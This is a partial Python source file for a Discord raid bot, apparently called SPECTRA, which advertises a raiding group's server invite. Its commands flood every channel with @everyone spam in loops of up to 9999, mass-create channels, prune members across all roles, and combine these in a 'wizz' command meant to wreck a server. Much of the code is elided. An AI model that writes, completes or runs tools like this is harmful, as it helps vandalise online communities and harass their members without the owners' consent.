...
async def on_ready():
       ...
       print('• DISCORD   : https://discord.gg/cordreapers  ')
       print('ㅤㅤㅤㅤㅤ')
       print('ㅤㅤㅤㅤㅤ')
       print(f'{Fore.GREEN}⌦ ¤ Join Our Discord Server For Help ¤ ⌦')
       print("""
────────────────────────────────────────────────────────────────────────────────────────────
                     ███████╗██████╗ ███████╗ ██████╗████████╗██████╗  █████╗ 
                     ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
...
async def spam_to_all_channels(ctx, amount: int = 50, *, text="@everyone ZoRo x Walter Rule Cord https://discord.gg/cordreapers"):
...
async def masschannel(ctx, amount: int = 25, *, name="ZoRo x Walter Rule Cord"):
    for i in range(amount):
        try:
...
async def prune(ctx: commands.Context):
 ...
 pruned= await ctx.guild.prune_members(days=1,roles=ctx.guild.roles,reason="@Walter On Top | gg/cordreapers")
...
async def wizz(ctx, amount: int = 5):
    ...
    for i in range(5):
            channel_names = ['ZoRo x Walter Rule Cord','CR on top', 'CR ON TOP', 'ZoRo Op', 'crop', 'SPECTRA S3LfBxT V1']
            await ctx.guild.create_text_channel(name=random.choice(channel_names))
            print(f"Created channel")
    for i in range(9999):
        tospam = ['@everyone @here ZORO X @WALTER . Rule Cord https://discord.gg/cordreapers', '@everyone @here Wizzed by ZoRo x @Walter . https://discord.gg/cordreapers', '@everyone @here https://discord.gg/cordreapers']
        for ch in ctx.guild.channels:
